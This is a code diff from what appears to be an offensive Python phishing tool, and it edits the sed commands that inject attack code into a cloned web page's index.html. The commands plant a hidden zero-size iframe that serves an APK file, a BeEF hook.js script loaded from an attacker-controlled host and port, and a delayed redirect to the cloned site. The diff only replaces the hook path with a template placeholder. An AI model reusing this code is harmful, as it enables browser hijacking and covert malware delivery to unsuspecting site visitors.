@@ -728,7 +728,7 @@ class atj:
                             'sed -i \'s#</body>#<iframe id="frame" src="' + CLS_RN + '-b.apk" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>\\n<script src="http://' + NoIP + ':3000/hook.js"></script>\\n<script type="text/javascript">setTimeout(function(){window.location.href="' + URL_CLONE + '";}, 15000);</script></body>#g\' /var/www/html/index.html',
                             shell=True)
                         subprocess.call(
-                            'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + atj.bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'/hook.js' + atj.bslash1 + '" type=' + atj.bslash1 + '"text/javascript' + atj.bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
+                            'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + atj.bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'<%= @hook_uri %>' + atj.bslash1 + '" type=' + atj.bslash1 + '"text/javascript' + atj.bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
                             shell=True)
                         subprocess.call(
                             'sed -i -e \'s/\/root\///g\' /var/www/html/index.html',
@@ -849,7 +849,7 @@ class atj:
                             'sed -i \'s#</body>#<iframe id="frame" src="' + CLS_RN + '-b.apk" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>\\n<script src="http://' + LGHOST + ':' + LGPORT_BEEF + '/hook.js"></script>\\n<script type="text/javascript">setTimeout(function(){window.location.href="' + URL_CLONE + '";}, 15000);</script></body>#g\' /var/www/html/index.html',
                             shell=True)
                         subprocess.call(
-                            'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + atj.bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'/hook.js' + atj.bslash1 + '" type=' + atj.bslash1 + '"text/javascript' + atj.bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
+                            'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + atj.bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'<%= @hook_uri %>' + atj.bslash1 + '" type=' + atj.bslash1 + '"text/javascript' + atj.bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
                             shell=True)
                         subprocess.call(
                             'sed -i -e \'s/\/root\///g\' /var/www/html/index.html',
@@ -964,7 +964,7 @@ class atj:
                             'sed -i \'s#</body>#\\n<script src="http://' + NoIP + ':3000/hook.js"></script></body>#g\' /var/www/html/index.html',
                             shell=True)
                         subprocess.call(
-                            'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + atj.bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'/hook.js' + atj.bslash1 + '" type=' + atj.bslash1 + '"text/javascript' + atj.bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
+                            'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + atj.bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'<%= @hook_uri %>' + atj.bslash1 + '" type=' + atj.bslash1 + '"text/javascript' + atj.bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
                             shell=True)
                         subprocess.call(
                             'sed -i -e \'s/\/root\///g\' /var/www/html/index.html',
@@ -1097,7 +1097,7 @@ class atj:
                             'sed -i \'s#</body>#\\n<script src="http://' + LGHOST + ':' + LGPORT_BEEF + '/hook.js"></script></body>#g\' /var/www/html/index.html',
                             shell=True)
                         subprocess.call(
-                            'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + atj.bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'/hook.js' + atj.bslash1 + '" type=' + atj.bslash1 + '"text/javascript' + atj.bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
+                            'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + atj.bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'<%= @hook_uri %>' + atj.bslash1 + '" type=' + atj.bslash1 + '"text/javascript' + atj.bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
                             shell=True)
                         subprocess.call(
                             'sed -i -e \'s/\/root\///g\' /var/www/html/index.html',
@@ -1489,7 +1489,7 @@ class atj:
                             'sed -i \'s#</body>#\\n<script src="http://' + NoIP + ':3000/hook.js"></script></body>#g\' /var/www/html/index.html',
                             shell=True)
                         subprocess.call(
-                            'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + atj.bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'/hook.js' + atj.bslash1 + '" type=' + atj.bslash1 + '"text/javascript' + atj.bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
+                            'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + atj.bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'<%= @hook_uri %>' + atj.bslash1 + '" type=' + atj.bslash1 + '"text/javascript' + atj.bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
                             shell=True)
                         subprocess.call(
                             'sed -i -e \'s/\/root\///g\' /var/www/html/index.html',
@@ -1659,7 +1659,7 @@ class atj:
                             'sed -i \'s#</body>#\\n<script src="http://' + LGHOST + ':' + LGPORT_BEEF + '/hook.js"></script></body>#g\' /var/www/html/index.html',
                             shell=True)
                         subprocess.call(
-                            'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + atj.bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'/hook.js' + atj.bslash1 + '" type=' + atj.bslash1 + '"text/javascript' + atj.bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
+                            'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + atj.bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'<%= @hook_uri %>' + atj.bslash1 + '" type=' + atj.bslash1 + '"text/javascript' + atj.bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
                             shell=True)
                         subprocess.call(
                             'sed -i -e \'s/\/root\///g\' /var/www/html/index.html',
@@ -1958,7 +1958,7 @@ class atj:
                             'sed -i \'s#</body>#\\n<script src="http://' + NoIP + ':3000/hook.js"></script></body>#g\' /var/www/html/index.html',
                             shell=True)
                         subprocess.call(
-                            'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + atj.bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'/hook.js' + atj.bslash1 + '" type=' + atj.bslash1 + '"text/javascript' + atj.bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
+                            'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + atj.bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'<%= @hook_uri %>' + atj.bslash1 + '" type=' + atj.bslash1 + '"text/javascript' + atj.bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
                             shell=True)
                         subprocess.call(
                             'sed -i -e \'s/\/root\///g\' /var/www/html/index.html',
@@ -2419,7 +2419,7 @@ class atj:
                             'sed -i \'s#</body>#\\n<script src="http://' + NoIP + ':3000/hook.js"></script></body>#g\' /var/www/html/index.html',
                             shell=True)
                         subprocess.call(
-                            'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + atj.bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'/hook.js' + atj.bslash1 + '" type=' + atj.bslash1 + '"text/javascript' + atj.bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
+                            'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + atj.bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'<%= @hook_uri %>' + atj.bslash1 + '" type=' + atj.bslash1 + '"text/javascript' + atj.bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
                             shell=True)
                         subprocess.call(
                             'sed -i -e \'s/\/root\///g\' /var/www/html/index.html',
